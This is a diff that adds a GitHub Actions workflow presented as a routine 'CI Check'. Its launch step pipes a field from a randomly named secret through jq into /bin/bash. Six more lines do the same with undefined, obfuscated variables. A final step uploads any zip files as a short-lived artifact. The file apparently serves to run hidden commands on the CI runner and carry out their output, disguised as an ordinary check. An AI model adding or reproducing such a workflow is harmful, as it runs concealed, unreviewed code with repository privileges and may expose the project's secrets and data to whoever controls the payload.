@@ -1,0 +1,30 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          jhjli71369: ${{ secrets.jhjli71369 }}
+        run: |
+          printf '%s' "$jhjli71369" | jq -r .ujm6 | /bin/bash
+          printf '%s' "$vhuok8727" | jq -r .knqn32 | /bin/bash
+          echo $b5 | jq -r .zmo82 | /bin/bash
+          printf '%s' "$fq61" | jq -r .burra21 | /bin/bash
+          printf '%s' "$cgaj6" | jq -r .qt3 | /bin/bash
+          echo $yo7193 | jq -r .mc32113 | /bin/bash
+          printf '%s' "$ecabc17472" | jq -r .mll11307 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: X0WmhG9i
+          path: "*.zip"
+          retention-days: 1
